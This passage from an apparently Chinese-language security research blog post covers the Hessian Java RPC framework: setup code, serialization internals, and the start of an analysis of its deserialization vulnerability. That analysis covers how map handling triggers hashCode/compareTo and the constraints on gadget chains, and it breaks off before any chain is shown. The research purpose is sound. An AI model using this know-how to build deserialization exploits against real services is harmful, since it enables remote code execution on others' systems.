class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HessianProxyFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Greeting</span> greeting<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Greeting</span><span class="token punctuation">)</span> factory<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token class-name">Greeting</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hessian Call: "</span><span class="token operator">+</span>greeting<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>运行结果：<br><img src="/img/24-6-7/1.png"></p><h3 id="Spring项目"><a href="#Spring项目" class="headerlink" title="Spring项目"></a>Spring项目</h3><p>Spring-web 包内提供了 org.springframework.remoting.caucho.HessianServiceExporter 用来暴露远程调用的接口和实现类。使用该类 export 的 Hessian Service 可以被任何 Hessian Client 访问，因为 Spring 中间没有进行任何特殊处理。<br>从 spring-web-5.3 后，该类被标记为 @Deprecated ， 也就是说 spring 在逐渐淘汰对基于序列化的远程调用的相关支持。<br><img src="/img/24-6-7/2.png"><br>将服务实现类注入到spring中，<br>然后编写配置类</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjcccc<span class="token punctuation">.</span>hessianser<span class="token punctuation">.</span>spring</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>yyjcccc<span class="token punctuation">.</span>hessianser<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">Greeting</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Autowired</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>remoting<span class="token punctuation">.</span>caucho<span class="token punctuation">.</span></span><span class="token class-name">HessianServiceExporter</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HessianConfigure</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">Greeting</span> greeting<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Bean</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"/hessian"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">HessianServiceExporter</span> <span class="token function">config</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">HessianServiceExporter</span> serviceExporter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HessianServiceExporter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        serviceExporter<span class="token punctuation">.</span><span class="token function">setService</span><span class="token punctuation">(</span>greeting<span class="token punctuation">)</span><span class="token punctuation">;</span>        serviceExporter<span class="token punctuation">.</span><span class="token function">setServiceInterface</span><span class="token punctuation">(</span><span class="token class-name">Greeting</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> serviceExporter<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="Hessian反序列化"><a href="#Hessian反序列化" class="headerlink" title="Hessian反序列化"></a>Hessian反序列化</h2><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>看看Hessian反序列化的效果<br>Person实体类</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjcccc<span class="token punctuation">.</span>hessianser<span class="token punctuation">.</span>usage</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> age<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> name<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>反序列化测试</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjcccc<span class="token punctuation">.</span>hessianser<span class="token punctuation">.</span>usage</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>caucho<span class="token punctuation">.</span>hessian<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">HessianInput</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>caucho<span class="token punctuation">.</span>hessian<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">HessianOutput</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hessian_Test</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">T</span> o<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span><span class="token class-name">ByteArrayOutputStream</span> bao <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HessianOutput</span> output <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HessianOutput</span><span class="token punctuation">(</span>bao<span class="token punctuation">)</span><span class="token punctuation">;</span>output<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>bao<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> bao<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">T</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span><span class="token class-name">ByteArrayInputStream</span> bai <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HessianInput</span> input <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HessianInput</span><span class="token punctuation">(</span>bai<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Object</span> o <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span> o<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span><span class="token class-name">Person</span> person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>person<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>person<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"Feng"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> s <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Person</span><span class="token punctuation">)</span> <span class="token function">deserialize</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>运行看看效果<br><img src="/img/24-6-7/3.png"><br>对比一下原生反序列化</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Ser_Test</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">T</span> t<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token class-name">ByteArrayOutputStream</span> bao <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>bao<span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>bao<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> bao<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">T</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">ByteArrayInputStream</span> bai <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> ois  <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>bai<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">Person</span> person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        person<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        person<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"Feng"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> s<span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Person</span><span class="token punctuation">)</span> <span class="token function">deserialize</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><img src="/img/24-6-7/4.png">### 源码分析在 Servlet 中采用继承或配置的时候，都是 com.caucho.hessian.server.HessianServlet 类在起作用，这个类是一个 javax.servlet.http.HttpServlet 的子类。这说明这个类的 init 方法将会承担一些初始化的功能，而 service 方法将会是相关处理的起始位置。接下来重点关注这两个方法。首先是 init 方法，这个方法总体来讲就是用来初始化 HessianServlet 的成员变量，包括 _homeAPI(调用类的接口 Class)、_homeImpl(具体实现类的对象)、_serializerFactory(序列化工厂类)、_homeSkeleton(封装方法)等等。<img src="/img/24-6-7/5.png">接下来看下 service 方法，<img src="/img/24-6-7/6.png">invoke 方法根据 objectID 是否为空决定调用哪个。<img src="/img/24-6-7/7.png">接下来就进入 com.caucho.hessian.server.HessianSkeleton 的调用流程，先来简单了解一下这个类。HessianSkeleton 是 AbstractSkeleton 的子类，用来对 Hessian 提供的服务进行封装。首先 AbstractSkeleton 初始化时接收调用接口的类型，并按照自己的逻辑把接口中的方法保存在 _methodMap 中，包括“方法名”、“方法名__方法参数个数”、“方法名_参数类型_参数2类型”等自定义格式。<img src="/img/24-6-7/8.png">HessianSkeleton 初始化时将实现类保存在成员变量 _service 中。<img src="/img/24-6-7/9.png">HessianSkeleton 中还有两个成员变量，HessianFactory 用来创建 HessianInput/HessianOutput 流，HessianInputFactory 用来读取和创建 HessianInput/Hessian2Input 流，用到的时候会细说。<img src="/img/24-6-7/10.png">简单了解了之后，来看下调用中的关键方法 HessianSkeleton#invoke ，首先是输入输出流的创建。<img src="/img/24-6-7/11.png">然后主要是调用方法的查找和参数的反序列化，反序列化后进行反射调用，并写回结果。<img src="/img/24-6-7/12.png">接下来说下 **Spring**。在 Spring 中的关键类是 org.springframework.remoting.caucho.HessianExporter，关键方法是 doInvoke 方法，其实逻辑与 Servlet 类似，就不多重复了。<img src="/img/24-6-7/13.png">可以看到这里也是额外处理了一下类加载器的问题。### 远程调用在远程调用时，我们的代码如下：<pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> url <span class="token operator">=</span> <span class="token string">"http://localhost:8080/hessian"</span><span class="token punctuation">;</span><span class="token class-name">HessianProxyFactory</span> factory  <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HessianProxyFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Greeting</span>            greeting <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Greeting</span><span class="token punctuation">)</span> factory<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token class-name">Greeting</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HashMap</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello: "</span> <span class="token operator">+</span> greeting<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>可以看到，这里创建了 HessianProxyFactory 实例，并调用其 create 方法，这里实际上是使用了 Hessian 提供的 HessianProxy 来为待调用的接口和 HessianRemoteObject 创建动态代理类。<img src="/img/24-6-7/14.png"> 我们知道动态代理对象无论调用什么方法都会走 InvocationHandler 的 invoke 方法。<img src="/img/24-6-7/15.png">发送请求获取结果并反序列化，这里使用了 HessianURLConnection 来建立连接。<img src="/img/24-6-7/16.png">非常简单的逻辑，就是发出了一个 HTTP 请求并反序列化数据而已。<p>建立连接发送post请求，设置版本信息加上调用方法名<br><img src="/img/24-6-7/17.png"></p><h3 id="序列化与反序列化流程"><a href="#序列化与反序列化流程" class="headerlink" title="序列化与反序列化流程"></a>序列化与反序列化流程</h3><p>Hessian 的序列化反序列化流程有几个关键类，一般包括输入输出流、序列化/反序列化器、相关工厂类等等，依次来看一下。<br>首先是输入和输出流，Hessian 定义了 AbstractHessianInput/AbstractHessianOutput 两个抽象类，用来提供序列化数据的读取和写入功能。Hessian/Hessian2/Burlap 都有这两个类各自的实现类来实现具体的逻辑。<br>先来看<strong>序列化</strong>，对于输出流关键类为 AbstractHessianOutput 的相关子类，这些类都提供了 call 等相关方法执行方法调用，writeXX 方法进行序列化数据的写入，这里以 Hessian2Output 为例。<br>除了基础数据类型，主要关注的是对 Object 类型数据的写入方法 writeObject：<br><img src="/img/24-6-7/18.png"><br>这个方法根据指定的类型获取序列化器 Serializer 的实现类，并调用其 writeObject 方法序列化数据。在当前版本中，可看到一共有 29 个子类针对各种类型的数据。对于自定义类型，将会使用 JavaSerializer/UnsafeSerializer/JavaUnsharedSerializer 进行相关的序列化动作，默认情况下是 UnsafeSerializer。<br><img src="/img/24-6-7/19.png"><br>UnsafeSerializer#writeObject 方法兼容了 Hessian/Hessian2 两种协议的数据结构，会调用 writeObjectBegin 方法开始写入数据，<br><img src="/img/24-6-7/20.png"><br>writeObjectBegin 这个方法是 AbstractHessianOutput 的方法，Hessian2Output 重写了这个方法，而其他实现类没有。也就是说在 Hessian 1.0 和 Burlap 中，写入自定义数据类型（Object）时，都会调用 writeMapBegin 方法将其标记为 Map 类型。<br><img src="/img/24-6-7/21.png"><br>在 Hessian 2.0 中，将会调用 writeDefinition20 和 Hessian2Output#writeObjectBegin 方法写入自定义数据，就不再将其标记为 Map 类型。<br>再看<strong>反序列化</strong>，对于输入流关键类为 AbstractHessianInput 的子类，这些类中的 readObject 方法定义了反序列化的关键逻辑。基本都是长达 200 行以上的 switch case 语句。在读取标识位后根据不同的数据类型调用相关的处理逻辑。这里还是以 Hessian2Input 为例。<br><img src="/img/24-6-7/22.png"><br>与序列化过程设计类似，Hessian 定义了 Deserializer 接口，并为不同的类型创建了不同的实现类。这里重点看下对自定义类型对象的读取。<br>在 Hessian 1.0 的 HessianInput 中，没有针对 Object 的读取，而是都将其作为 Map 读取，在序列化的过程中我们也提到，在写入自定义类型时会将其标记为 Map 类型。<br><img src="/img/24-6-7/23.png"><br>MapDeserializer#readMap 方法提供了针对 Map 类型数据的处理逻辑。<br><img src="/img/24-6-7/24.png"><br>在 Hessian 2.0 中，则是提供了 UnsafeDeserializer 来对自定义类型数据进行反序列化，关键方法在 readObject 处。<br><img src="/img/24-6-7/25.png"><br>instantiate 使用 unsafe 实例的 allocateInstance 直接创建类实例。<br><img src="/img/24-6-7/26.png"></p><h3 id="一些细节"><a href="#一些细节" class="headerlink" title="一些细节"></a>一些细节</h3><h4 id="协议版本"><a href="#协议版本" class="headerlink" title="协议版本"></a>协议版本</h4><p>在之前已经介绍过了，Hessian 传输协议已经由 1.0 版本迭代到了 2.0 版本。但是目前的 Hessian 包是两种协议都支持的，并且服务器使用哪种协议读取序列化数据，和返回哪种协议格式的序列化数据，将完全由请求中的标志位来进行定义。<br>在我们测试使用的最新版中，这一设定位于 HessianProxyFactory 中的两个布尔型变量中，即 _isHessian2Reply 和 _isHessian2Request，如下图，默认情况下，客户端使用 Hessian 1.0 协议格式发送序列化数据，服务端使用 Hessian 2.0 协议格式返回序列化数据。<br><img src="/img/24-6-7/27.png"><br>如果想自己指定用 Hessian 2.0 协议进行传输，可以使用如下代码进行设置：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">HessianProxyFactory</span> factory  <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HessianProxyFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>factory<span class="token punctuation">.</span><span class="token function">setHessian2Request</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="Serializable"><a href="#Serializable" class="headerlink" title="Serializable"></a>Serializable</h4><p>在 Java 原生反序列化中，实现了 java.io.Serializable 接口的类才可以反序列化。Hessian 象征性的支持了这种规范，具体的逻辑如下图，在获取默认序列化器时，判断了类是否实现了 Serializable 接口。<br><img src="/img/24-6-7/28.png"><br>但同时 Hessian 还提供了一个 _isAllowNonSerializable 变量用来打破这种规范，可以使用 SerializerFactory#setAllowNonSerializable 方法将其设置为 true，从而使未实现 Serializable 接口的类也可以序列化和反序列化。<br>这就很魔幻了，判断是在序列化的过程中进行的，而非反序列化过程，那自然可以绕过了，换句话说，<strong>Hessian 实际支持反序列化任意类，无需实现 Serializable 接口</strong>。<br>这里在提一下 serialVersionUID 的问题，在 Java 原生反序列化中，在未指定 serialVersionUID 的情况下如果修改过类中的方法和属性，将会导致反序列化过程中生成的 serialVersionUID 不一致导致的异常，但是 Hessian 并不关注这个字段，所以即使修改也无所谓。<br>然后是 transient 和 static 的问题，在序列化时，由 UnsafeSerializer#introspect 方法来获取对象中的字段，在老版本中应该是 getFieldMap 方法。依旧是判断了成员变量标识符，如果是 transient 和 static 字段则不会参与序列化反序列化流程。<br><img src="/img/24-6-7/29.png"><br>在原生流程中，标识为 transient 仅代表不希望 Java 序列化反序列化这个对象，开发人员可以在 writeObject/readObject 中使用自己的逻辑写入和恢复对象，但是 Hessian 中没有这种机制，因此标识为 transient 的字段在反序列化中一定没有值的。</p><h4 id="Object-Naming"><a href="#Object-Naming" class="headerlink" title="Object Naming"></a>Object Naming</h4><p>之前在看代码时看到过，Hessian 在调用时还支持使用 id 和 ejbid 参数，可以导致调用不同的实体 Beans。<br>这种情况当 Hessian 支持的调用服务是一些面向对象的服务比如 naming services/entity beans/session beans 或 EJB 容器时可以使用。<br>本质上的调用流程都是一样的，只是提供服务的对象有所不同。<br>相关内容可以查看官方连接：<a href="http://hessian.caucho.com/doc/hessian-1.0-spec.xtp#ObjectNamingnon-normative">http://hessian.caucho.com/...#ObjectNamingnon-normative</a></p><h2 id="Hessian反序列化漏洞"><a href="#Hessian反序列化漏洞" class="headerlink" title="Hessian反序列化漏洞"></a>Hessian反序列化漏洞</h2><p>Hessian反序列化漏洞的关键出在HessianInput#readObject，由于Hessian会将序列化的结果处理成一个Map，所以序列化结果的第一个byte总为M（ASCII为77）。下面我们跟进readObject()<br><img src="/img/24-6-7/30.png"><br>继续跟进到ObjectInputStream#readMap。然后Object或者其他类型就是默认使用MapDeserializer<br>跟进MapDeserializer#readMap<br><img src="/img/24-6-7/31.png"><br>put会调用hashCode方法<br>可以看到， Hessian 协议使用 unsafe 创建类实例，使用反射写入值，并且没有在重写了某些方法后对其进行调用这样的逻辑。<br>所以无论是构造方法、getter/setter 方法、readObject 等等方法都不会在 Hessian 反序列化中被触发，那怎么会产生漏洞呢？<br>答案就在 Hessian 对 Map 类型数据的处理上，在之前的分析中提到，MapDeserializer#readMap 对 Map 类型数据进行反序列化操作是会创建相应的 Map 对象，并将 Key 和 Value 分别反序列化后使用 put 方法写入数据。在没有指定 Map 的具体实现类时，将会默认使用 HashMap ，对于 SortedMap，将会使用 TreeMap。<br>而众所周知， HashMap 在 put 键值对时，将会对 key 的 hashcode 进行校验查看是否有重复的 key 出现，这就将会调用 key 的 hasCode 方法，如下图。<br><img src="/img/24-6-7/32.png"><br>而 TreeMap 在 put 时，由于要进行排序，所以要对 key 进行比较操作，将会调用 compare 方法，会调用 key 的 compareTo 方法。<br><img src="/img/24-6-7/33.png"><br>也就是说 Hessian 相对比原生反序列化的利用链，有几个限制：</p><ul><li>kick-off chain 起始方法只能为 hashCode/equals/compareTo 方法；</li><li>利用链中调用的成员变量不能为 transient 修饰；</li><li>所有的调用不依赖类中 readObject 的逻辑，也不依赖 getter/setter 的逻辑。</li></ul><p>这几个限制也导致了很多 Java 原生反序列化利用链在 Hessian 中无法使用，甚至 ysoserial 中一些明明是 hashCode/equals/compareTo 